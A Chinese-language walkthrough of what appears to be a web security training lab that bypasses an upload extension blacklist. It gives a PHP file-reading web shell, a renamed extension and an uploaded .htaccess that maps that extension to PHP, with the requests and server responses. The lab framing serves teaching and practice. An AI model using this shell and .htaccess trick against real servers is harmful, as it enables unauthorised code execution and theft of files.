# 实验：通过绕过扩展名黑名单上传 Web Shell

本实验包含一个易受攻击的图片上传功能。某些文件扩展名被列入黑名单，但由于该黑名单配置中存在根本性缺陷，此防御措施可以被绕过。

为了解决本实验，请上传一个基本的 PHP Web Shell，然后利用它窃取 `/home/carlos/secret` 文件的内容。使用实验室横幅中提供的按钮提交此秘密信息。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你需要上传两个不同的文件才能解决此实验。

## 步骤


- 在账户页面发现头像上传功能
- 将 php 代码放入 php 文件 `x.php` 中

    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
- 提交载荷文件
    - 服务器响应
        ```
        Sorry, php files are not allowed
        Sorry, there was an error uploading your file.
        ```
        - 上传被阻止

- 修改文件扩展名
    `filename="x.anytype"`
    - 服务器响应
        `The file avatars/x.anytype has been uploaded.`
        - 上传成功

- 访问账户页面，自动请求头像
    ```http
    GET /files/avatars/x.anytype HTTP/2
    ```
    - 服务器响应普通的文件文本，而不是作为代码执行
        `<?php echo file_get_contents('/home/carlos/secret'); ?>`


- 尝试设置服务器 Apache 的目录级配置，添加类型与执行映射
    - 将内容 `AddType application/x-httpd-php .anytype` 保存为 `.htaccess` 文件
    - 上传文件
    - 服务器响应
        `The file avatars/.htaccess has been uploaded.`
        - 此时，配置文件与头像在同一目录下，目录级配置文件覆盖全局设置

- 访问头像端点
    ```http
    GET /files/avatars/x.anytype HTTP/2
    ```
    - 提取数据的 php 代码成功执行
